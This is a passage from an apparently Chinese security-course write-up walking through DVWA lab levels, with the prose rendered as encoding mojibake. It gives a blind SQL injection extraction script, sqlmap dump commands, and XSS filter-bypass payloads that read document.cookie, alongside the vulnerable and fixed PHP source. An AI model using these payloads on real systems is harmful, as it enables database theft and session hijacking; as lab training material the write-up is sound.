class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.5.8.66</span>/dvwa/vulnerabilities/sqli/<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: id=<span class="hljs-number">1</span>; security=high; PHPSESSID=e<span class="hljs-number">31</span>dkassqtg<span class="hljs-number">9388</span>l<span class="hljs-number">159</span>fn<span class="hljs-number">72</span>ac<span class="hljs-number">1</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></code></pre><p>æŠ“åŒ…åå¯ä»¥å‘ç°æäº¤çš„å‚æ•°<code>id</code>åœ¨cookieä¸­ï¼Œæ‰€ä»¥ä¸ä¸­çº§åˆ«çš„æ–¹æ³•ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨sqlmapæ³¨å…¥ã€‚</p><h4 id="æ‰‹å·¥åŠ è„šæœ¬-2"><a href="#æ‰‹å·¥åŠ è„šæœ¬-2" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>é€šè¿‡æ‰‹å·¥æµ‹è¯•å‘ç°æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸lowçº§åˆ«çš„è„šæœ¬å¤§åŒå°å¼‚ï¼Œåªæ˜¯å°†æ³¨å…¥çš„ä½ç½®æ”¹åˆ°äº†cookieçš„ä½ç½®</p><p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" alt="bsqlh-3.png"></p><p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" alt="bsqlh-4.png"></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>t=<span class="hljs-string">&quot;&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-built_in">id</span> = payload        header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;id=&quot;</span>+payload+<span class="hljs-string">&quot;;&quot;</span>+<span class="hljs-string">&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;        <span class="hljs-comment">#print(header)</span>        response = requests.post(url,headers = header)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    print(mid)    <span class="hljs-comment">#print(t)</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)print(flag)</code></pre><h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre><p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" alt="bsqlh-5.png"></p><h3 id="sqlæ³¨å…¥é˜²å¾¡"><a href="#sqlæ³¨å…¥é˜²å¾¡" class="headerlink" title="sqlæ³¨å…¥é˜²å¾¡"></a>sqlæ³¨å…¥é˜²å¾¡</h3><p>é€šè¿‡æŸ¥çœ‹impossibleæºç å‘ç°æ£€æµ‹äº†idæ•°æ®ç±»å‹ï¼Œä½¿ç”¨äº†é¢„ç¼–è¯‘ç»‘å®šidå˜é‡ï¼Œæœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥ï¼Œè¿™äº›å¯ä»¥åœ¨ä»¥åç¼–ç¨‹ä¸­åº”ç”¨ï¼Œä»¥ç¼–å†™å‡ºæ›´åŠ å®‰å…¨çš„ä»£ç ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Check Anti-CSRF token</span>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];    <span class="hljs-comment">// Was a number entered?</span>    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;   <span class="hljs-comment">//æ£€æµ‹æäº¤çš„æ•°æ®æ˜¯å¦ä¸ºæ•°å­—ç±»å‹</span>        <span class="hljs-comment">// Check the database</span>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<span class="hljs-comment">//é¢„ç¼–è¯‘ç»‘å®šäº†idå˜é‡</span>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );        <span class="hljs-variable">$data</span>-&gt;execute();        <span class="hljs-comment">// Get results</span>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;            <span class="hljs-comment">// Feedback for end user</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span>            header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );            <span class="hljs-comment">// Feedback for end user</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-comment">// Generate Anti-CSRF token</span>generateSessionToken();<span class="hljs-meta">?&gt;</span></code></pre><h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p> å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº†nameå‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„XSSæ¼æ´ ã€‚</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" alt="image-20201026202557058"></p><p>è·å–cookie</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" alt="image-20201026202647823"></p><h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä»£ç å®¡è®¡åå¯ä»¥å‘ç°æ˜¯å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå°†<strong>&lt;script&gt;</strong>æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚</p><p>æ„é€ payloadï¼š</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//ä½¿ç”¨å…¶ä»–æ ‡ç­¾<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre><p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p><h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<span class="hljs-comment">// Is there any input?</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );    <span class="hljs-comment">// Feedback for end user</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å…ˆä»£ç å®¡è®¡ï¼Œæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ <code>(.*)</code> è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ<code>/i</code> è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº  <code>&lt;script&gt;</code> æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚</p><p>æ„é€ payloadï¼š</p><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre><p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p><h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Sanitize name input</span>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Update database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p> <code>isset()</code> å‡½æ•°åœ¨phpä¸­ç”¨æ¥æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/false </p><p> <code>trim()</code> å‡½æ•°ä½œç”¨ä¸ºç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ </p><p> <code>stripslashes()</code> å‡½æ•°ç”¨äºåˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ  </p><p> <code>mysqli_real_escape_string()</code> å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå·<code>(\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ&#39;ï¼Œ&quot;ï¼Œ\x1a)</code> è¿›è¡Œè½¬ä¹‰ </p><p> åœ¨ä»£ç ä¸­å¯¹messageï¼Œnameè¾“å…¥æ¡†å†…å®¹  æ²¡æœ‰è¿›è¡ŒXSSæ–¹é¢çš„è¿‡æ»¤å’Œæ£€æŸ¥ </p><p> ä¸”é€šè¿‡  <code>query</code> è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚æ‰€ä»¥å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´ </p><p>è¿™é‡Œname ,messageçš„è¾“å…¥æ¡†ä¸­éƒ½å­˜åœ¨xssï¼Œæ‰€ä»¥ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯nameä½ç½®æœ‰å­—æ•°é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨bpæŠ“åŒ…ä¿®æ”¹</p><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" alt="image-20201026203331497"></p><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" alt="image-202010262032"></p><p>ç”±äºæ˜¯å­˜å‚¨å‹XSS,æ‰€ä»¥æ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šå¼¹å‡ºcookieã€‚</p><h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );    <span class="hljs-comment">// Sanitize name input</span>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Update database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre><p> <code>strip_tags()</code> å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚ </p><p> <code>addslashes()</code> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </p><p> <code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  </p><p> å¯¹messageè¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç </p><p>ä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†<code>&lt;script&gt;</code>å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSï¼Œä¸åå°„å‹ä¸­çº§çš„ä¸€æ ·çš„æ–¹æ³•</p><p>payload</p><pre><code class="hljs xml">ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œè¾“å…¥  &lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¾“å…¥<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼Œå¦‚  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre><p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" alt="xssstored2.png"></p><h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span 